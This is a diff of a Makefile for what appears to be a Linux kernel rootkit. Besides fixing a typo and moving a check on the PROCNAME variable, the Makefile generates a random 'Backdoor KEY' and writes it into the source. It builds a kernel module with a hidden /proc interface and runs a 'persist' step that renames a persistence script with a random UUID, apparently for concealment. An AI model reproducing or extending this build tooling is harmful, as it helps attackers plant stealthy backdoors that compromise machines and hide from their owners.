@@ -8,22 +8,10 @@ endif
 
 LD=$(shell which ld)
 AS=$(shell which as)
-CTAGS=$(shell which ctags))
+CTAGS=$(shell which ctags)
 JOURNALCTL := $(shell which journalctl)
 UUIDGEN := $(shell uuidgen)
 BDKEY := $(shell echo "0x$$(od -vAn -N8 -tx8 < /dev/urandom | tr -d ' \n')")
-
-# TODO: Check if we can generate a random PROCNAME, something like:
-# PROCNAME ?= $(shell uuidgen | cut -c1-8)
-
-ifeq ($(origin PROCNAME), undefined)
-    $(error ERROR: PROCNAME is not defined. Please invoke make with PROCNAME="your_process_name")
-else ifeq ($(strip $(PROCNAME)),)
-    $(error ERROR: PROCNAME is empty. Please set PROCNAME to a non-empty value)
-endif
-
-# Display the selected PROCNAME during the build
-$(info -- Selected PROCNAME is $(PROCNAME))
 
 # PROCNAME, /proc/<name> interface.
 COMPILER_OPTIONS := -Wall -DPROCNAME='"$(PROCNAME)"' \
@@ -44,11 +32,16 @@ obj-m := ${OBJNAME}.o
 
 CC=gcc
 
+
 all: persist
+	# TODO: Check if we can generate a random PROCNAME, something like:
+	# PROCNAME ?= $(shell uuidgen | cut -c1-8)
+	$(if $(PROCNAME),,$(error ERROR: PROCNAME is not defined. Please invoke make with PROCNAME="your_process_name"))
 	sed -i 's/^#define BDKEY .*/#define BDKEY $(BDKEY)/' src/bdkey.h
 	make  -C  /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 	@echo -n "Backdoor KEY: "
 	@echo $(BDKEY) | sed 's/^0x//'
+	@echo PROCNAME=$(PROCNAME)
 
 persist:
 	sed -i "s|.lm.sh|${UUIDGEN}.sh|g" $(persist).S
